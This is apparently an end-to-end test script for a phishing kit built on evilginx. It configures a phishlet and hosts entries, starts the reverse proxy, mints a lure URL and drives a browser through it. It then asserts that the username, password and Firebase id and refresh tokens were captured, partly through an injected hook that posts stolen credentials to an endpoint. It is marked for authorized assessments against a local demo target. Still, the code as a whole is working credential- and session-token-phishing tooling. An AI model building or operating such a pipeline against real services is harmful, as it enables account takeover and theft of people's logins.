#!/usr/bin/env python3
"""
End-to-end Destinations integration test (steps 1–4).

Mirrors the desktop Destinations page by calling the same Rust control-plane
paths via `phishkit_ctl`, then uses Playwright to open the lure and submit
login credentials. Asserts a non-empty capture (username + password and/or
Firebase tokens) lands in the profile DB.

Authorized assessments only. Credentials via env (never committed):

  E2E_EMAIL=you@example.com
  E2E_PASSWORD=secret
  make e2e-destinations

Optional:
  E2E_TARGET=demo-cookie.local.phishkit   (default)
  E2E_HEADED=1                           show the browser
  E2E_KEEP_PROXY=1                       leave evilginx running
  E2E_TIMEOUT=90                         seconds to wait for capture
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import time
import urllib.parse
from pathlib import Path

KIT_ROOT = Path(__file__).resolve().parent.parent
CTL = KIT_ROOT / "desktop" / "src-tauri" / "target" / "debug" / "phishkit_ctl"
ARTIFACTS = KIT_ROOT / "run" / "e2e"


class E2EError(RuntimeError):
    pass


def log(msg: str) -> None:
    print(f"[e2e] {msg}", flush=True)


def ctl(*args: str) -> dict:
    if not CTL.is_file():
        raise E2EError(
            f"phishkit_ctl missing at {CTL}\n"
            "Build with: (cd apps/desktop/src-tauri && cargo build --bin phishkit_ctl)"
        )
    env = os.environ.copy()
    env["PHISHKIT_ROOT"] = str(KIT_ROOT)
    # GUI-launched PATH often lacks homebrew / cargo
    env["PATH"] = "/usr/local/bin:/opt/homebrew/bin:/usr/bin:/bin:" + env.get("PATH", "")
    proc = subprocess.run(
        [str(CTL), *args],
        cwd=str(KIT_ROOT),
        capture_output=True,
        text=True,
        env=env,
    )
    if proc.returncode != 0:
        raise E2EError(
            f"phishkit_ctl {' '.join(args)} failed ({proc.returncode}):\n"
            f"{proc.stderr or proc.stdout}"
        )
    out = (proc.stdout or "").strip()
    if not out:
        return {}
    try:
        return json.loads(out)
    except json.JSONDecodeError as e:
        raise E2EError(f"invalid JSON from phishkit_ctl: {e}\n{out[:2000]}") from e


def require_creds() -> tuple[str, str]:
    email = os.environ.get("E2E_EMAIL", "").strip()
    password = os.environ.get("E2E_PASSWORD", "").strip()
    if not email or not password:
        raise E2EError(
            "Set E2E_EMAIL and E2E_PASSWORD for the authorized test account.\n"
            "Example:\n"
            "  E2E_EMAIL='user@example.com' E2E_PASSWORD='…' make e2e-destinations"
        )
    return email, password


def capture_quality(row: dict) -> dict:
    data = row.get("data") or {}
    user = urllib.parse.unquote((data.get("username") or "").strip())
    password = (data.get("password") or "").strip()
    custom = data.get("custom") if isinstance(data.get("custom"), dict) else {}
    body = data.get("body_tokens") if isinstance(data.get("body_tokens"), dict) else {}
    tokens = {**custom, **body}
    has_firebase = bool(tokens.get("id_token") or tokens.get("refresh_token"))
    return {
        "id": row.get("evilginx_session_id") or row.get("evilginxSessionId"),
        "username": user,
        "has_password": bool(password),
        "remote_addr": data.get("remote_addr") or "",
        "has_firebase_tokens": has_firebase,
        "token_keys": sorted(tokens.keys()),
        "ok": bool(user and password) or has_firebase,
    }


def wait_for_capture(profile_id: str, email: str, timeout: float) -> dict:
    deadline = time.time() + timeout
    email_l = email.lower()
    last: list[dict] = []
    while time.time() < deadline:
        rows = ctl("sync-captures", "--profile-id", profile_id)
        if not isinstance(rows, list):
            rows = []
        last = rows
        for row in rows:
            q = capture_quality(row)
            if not q["ok"]:
                continue
            if q["username"] and email_l not in q["username"].lower():
                # allow capture even if username encoding differs
                if email_l.replace("@", "%40") not in (row.get("data") or {}).get(
                    "username", ""
                ).lower():
                    # still accept newest non-empty if created during this run window
                    pass
            if q["ok"]:
                return {"capture": q, "raw": row}
        time.sleep(2)
    # dump last for debugging
    ARTIFACTS.mkdir(parents=True, exist_ok=True)
    (ARTIFACTS / "last_captures.json").write_text(json.dumps(last, indent=2)[:50000])
    raise E2EError(
        f"No non-empty capture for {email!r} within {timeout:.0f}s. "
        f"See {ARTIFACTS / 'last_captures.json'} and kit/evilginx/run/evilginx.log"
    )


def browser_login(lure_url: str, email: str, password: str) -> None:
    try:
        from playwright.sync_api import sync_playwright
    except ImportError as e:
        raise E2EError(
            "playwright not installed. Run:\n"
            "  python3 -m pip install -r scripts/requirements.txt\n"
            "  python3 -m playwright install chromium"
        ) from e

    ARTIFACTS.mkdir(parents=True, exist_ok=True)
    headed = os.environ.get("E2E_HEADED", "").strip() in ("1", "true", "yes")
    log(f"Playwright → {lure_url} (headed={headed})")

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=not headed,
            args=["--ignore-certificate-errors"],
        )
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()
        creds_posts: list[str] = []

        def on_request(req):
            if "/__evilginx_creds" in req.url and req.method == "POST":
                creds_posts.append(req.url)
                log("saw POST /__evilginx_creds (Firebase hook fired)")

        page.on("request", on_request)

        try:
            page.goto(lure_url, wait_until="domcontentloaded", timeout=60_000)
            # SPA may redirect to /login
            page.wait_for_timeout(1500)

            # Prefer email/password inputs; fall back to text + password
            email_sel = (
                'input[type="email"], input[name*="email" i], input[id*="email" i], '
                'input[autocomplete="username"], input[placeholder*="email" i], '
                'input[placeholder*="Email" i]'
            )
            pass_sel = 'input[type="password"]'

            # Wait up to 30s for the login form to render
            page.wait_for_selector(pass_sel, timeout=30_000)
            if page.locator(email_sel).count() == 0:
                # some builds use type=text for email
                email_sel = 'input[type="text"], input:not([type])'
            page.wait_for_selector(email_sel, timeout=10_000)

            page.locator(email_sel).first.fill(email)
            page.locator(pass_sel).first.fill(password)

            # Submit: button with Sign/Log in, or Enter on password
            submit = page.locator(
                'button:has-text("Sign in"), button:has-text("Log in"), '
                'button:has-text("Login"), button[type="submit"], '
                'button:has-text("Continue")'
            )
            if submit.count() > 0:
                submit.first.click()
            else:
                page.locator(pass_sel).first.press("Enter")

            # Give hooks time to exfil + Firebase to respond
            for _ in range(20):
                page.wait_for_timeout(500)
                if creds_posts:
                    break
                # navigated away from login?
                if "/login" not in (page.url or "").lower():
                    break

            page.screenshot(path=str(ARTIFACTS / "after_login.png"), full_page=True)
            (ARTIFACTS / "after_login_url.txt").write_text(page.url or "")
            log(f"browser url after submit: {page.url}")
            if not creds_posts:
                log("WARNING: no /__evilginx_creds POST observed — hooks may not have run")
        except Exception:
            try:
                page.screenshot(path=str(ARTIFACTS / "failure.png"), full_page=True)
                (ARTIFACTS / "failure.html").write_text(page.content())
            except Exception:
                pass
            raise
        finally:
            context.close()
            browser.close()


def main() -> int:
    target = os.environ.get("E2E_TARGET", "demo-cookie.local.phishkit").strip()
    email, password = require_creds()
    timeout = float(os.environ.get("E2E_TIMEOUT", "90"))
    keep = os.environ.get("E2E_KEEP_PROXY", "").strip() in ("1", "true", "yes")

    log(f"KIT_ROOT={KIT_ROOT}")
    log(f"target={target} email={email}")

    # ── Step 1–2 · Target + Destination ──────────────────────────────────
    log("Step 1–2: detect + ensure destination / profile")
    setup = ctl("ensure-destination", "--target", target, "--name", target)
    profile = setup.get("profile") or {}
    phishlet = (setup.get("phishlet") or {}).get("phishlet") or profile.get("phishlet")
    dryrun = (setup.get("phishlet") or {}).get("dryrun_domain") or profile.get(
        "dryrun_domain"
    )
    profile_id = profile.get("id")
    if not profile_id or not phishlet or not dryrun:
        raise E2EError(f"ensure-destination incomplete: {json.dumps(setup)[:2000]}")
    if not setup.get("firebase_hooks"):
        log("WARNING: phishlet may lack Firebase js_inject — captures can be empty")
    log(f"profile={profile_id} phishlet={phishlet} dryrun={dryrun}")
    log(f"stack={(setup.get('detect') or {}).get('stack_info', {}).get('stack')}")

    # ── Step 3 · Proxy (hosts + lure) ────────────────────────────────────
    log("Step 3: hosts status / fix")
    hs = ctl("hosts-status", "--dryrun", dryrun, "--phishlet", phishlet)
    if not hs.get("hosts_ok"):
        log(f"hosts missing: {hs.get('missing_lines')}")
        fix = ctl("hosts-fix", "--dryrun", dryrun, "--phishlet", phishlet)
        log(f"hosts-fix → {fix}")
        hs = ctl("hosts-status", "--dryrun", dryrun, "--phishlet", phishlet)
        if not hs.get("hosts_ok"):
            raise E2EError(
                " /etc/hosts still incomplete after hosts-fix. "
                "Add these lines manually (sudo) and re-run:\n"
                + "\n".join(hs.get("missing_lines") or [])
            )
    else:
        log("hosts ok")

    log("Step 3: start evilginx + mint lure")
    lure = ctl(
        "start-lure",
        "--profile-id",
        profile_id,
        "--dryrun",
        dryrun,
        "--phishlet",
        phishlet,
    )
    lure_url = (lure.get("lure_url") or "").strip()
    if not lure_url:
        raise E2EError(f"no lure_url from start-lure: {json.dumps(lure)[:2000]}")
    if not lure.get("evilginx_running") and not lure.get("ok"):
        raise E2EError(f"evilginx did not start: {lure.get('message')}")
    log(f"lure={lure_url}")
    log(f"proxy message: {lure.get('message')}")

    # Brief settle for TLS / screen
    time.sleep(2)
    st = ctl("service-status")
    log(f"service-status: {st}")

    # ── Step 4 · Browser login + Captures ────────────────────────────────
    log("Step 4: Playwright login through lure")
    try:
        browser_login(lure_url, email, password)
    except Exception as e:
        raise E2EError(f"browser login failed: {e}") from e

    log("Step 4: sync captures and assert")
    result = wait_for_capture(profile_id, email, timeout)
    q = result["capture"]
    log(
        f"CAPTURED session={q['id']} user={q['username']!r} "
        f"password={'yes' if q['has_password'] else 'no'} "
        f"ip={q['remote_addr']!r} tokens={q['token_keys']}"
    )

    ARTIFACTS.mkdir(parents=True, exist_ok=True)
    (ARTIFACTS / "result.json").write_text(
        json.dumps(
            {
                "ok": True,
                "target": target,
                "profile_id": profile_id,
                "lure_url": lure_url,
                "capture": q,
            },
            indent=2,
        )
    )

    if not keep:
        log("stopping evilginx (set E2E_KEEP_PROXY=1 to leave up)")
        try:
            ctl("stop")
        except E2EError as e:
            log(f"stop warning: {e}")

    log("PASS — Destinations e2e complete")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except E2EError as e:
        print(f"[e2e] FAIL: {e}", file=sys.stderr)
        raise SystemExit(1)
